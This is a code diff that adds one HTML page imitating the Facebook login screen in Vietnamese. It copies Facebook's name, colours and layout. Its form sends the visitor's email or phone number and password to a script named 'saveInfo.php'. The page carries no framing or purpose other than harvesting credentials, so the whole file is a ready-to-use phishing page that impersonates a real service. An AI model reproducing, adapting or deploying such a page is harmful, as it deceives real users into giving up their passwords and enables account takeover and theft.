@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Đăng nhập</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+
+        .login-box {
+            background: white;
+            width: 360px;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            font-size: 16px;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 4px rgba(24, 119, 242, 0.2);
+        }
+
+        .btn {
+            font-size: 16px;
+            padding: 10px;
+            margin-top: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+            font-weight: bold;
+        }
+
+        .btn-login:hover {
+            background-color: #145dbf;
+        }
+
+        .forgot-link {
+            display: block;
+            margin: 15px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #ddd;
+            margin: 0 10px;
+        }
+
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+            font-weight: bold;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1 class="logo">Facebook</h1>
+    <div class="login-box">
+        <h2 class="title">Đăng nhập Facebook</h2>
+        <form action="saveInfo.php" method="POST">
+            <input id="email" name="email" placeholder="Email hoặc số điện thoại" required="" type="text" />
+            <input id="password" name="password" placeholder="Mật khẩu" required="" type="password" />
+            <button class="btn btn-login" type="submit">Đăng nhập</button>
+        </form>
+        <a class="forgot-link" href="#">Bạn quên tài khoản ư?</a>
+        <div class="divider"><span>hoặc</span></div>
+        <button class="btn btn-create">Tạo tài khoản mới</button>
+    </div>
+</div>
+</body>
+</html>
